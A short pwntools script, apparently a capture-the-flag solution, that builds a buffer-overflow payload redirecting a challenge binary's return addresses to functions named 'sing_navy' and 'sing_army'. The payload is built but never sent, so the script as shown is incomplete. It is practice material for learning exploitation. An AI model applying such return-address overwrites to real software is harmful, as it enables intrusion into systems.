from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

# stage1: sing usna alma mater
payload = cyclic(16)
payload += p64(e.sym['sing_navy']+8)

# stage2: sing usma alma mater
payload += cyclic(8)
payload += p64(e.sym['sing_army']+8)
payload += cyclic(256)

p.interactive()
